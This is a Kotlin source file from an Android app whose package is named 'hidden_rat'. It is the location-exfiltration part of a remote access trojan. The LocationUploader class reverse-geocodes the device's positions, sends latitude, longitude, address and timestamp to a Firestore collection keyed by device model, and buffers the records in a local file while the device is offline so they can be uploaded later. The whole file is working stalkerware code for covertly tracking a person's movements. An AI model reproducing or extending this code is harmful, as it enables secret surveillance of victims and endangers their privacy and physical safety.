package com.ratx.hidden_rat.uploader

import android.content.Context
import android.location.Geocoder
import android.net.ConnectivityManager
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.ratx.hidden_rat.R
import java.io.File
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LocationUploader(private val context: Context) {

    private val fileName = "offline_locations.txt"
    private val firestore = FirebaseFirestore.getInstance()
    private val gson = Gson()

    fun saveLocation(location: android.location.Location) {

        val geoCoder = Geocoder(context, Locale.getDefault())
        val address = try {
            geoCoder.getFromLocation(location.latitude, location.longitude, 1)?.get(0)
                ?.getAddressLine(0)
                ?: context.getString(R.string.address_not_found)
        } catch (e: IOException) {
            context.getString(R.string.address_not_found)
        }

        val model = LocationModel(location.latitude, location.longitude, address, getDateTime())

        if (isOnline(context)) {
            uploadLocationToFirestore(model)
        } else {
            saveLocationToFile(model)
        }
    }

    private fun uploadLocationToFirestore(model: LocationModel) {
        firestore.collection("locations_${android.os.Build.MODEL}").add(model)
            .addOnSuccessListener {
                deleteLocationFromFile(model)
            }
            .addOnFailureListener {
                saveLocationToFile(model)
            }
    }

    private fun saveLocationToFile(model: LocationModel) {
        try {
            val file = File(context.filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(gson.toJson(model))
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun deleteLocationFromFile(target: LocationModel) {
        val file = File(context.filesDir, fileName)
        if (!file.exists()) return

        val updatedList = mutableListOf<LocationModel>()
        file.bufferedReader().forEachLine { line ->
            val model = gson.fromJson(line, LocationModel::class.java)
            if (model != target) updatedList.add(model)
        }

        file.writeText("") // clear file

        FileWriter(file, true).use { writer ->
            updatedList.forEach {
                writer.append(gson.toJson(it))
                writer.append("\n")
            }
        }
    }


    private fun isOnline(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val netInfo = cm.activeNetworkInfo
        return netInfo != null && netInfo.isConnected
    }

    private fun getDateTime(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date())
    }

    data class LocationModel(
        val latitude: Double,
        val longitude: Double,
        val address: String,
        val timestamp: String
    )
}
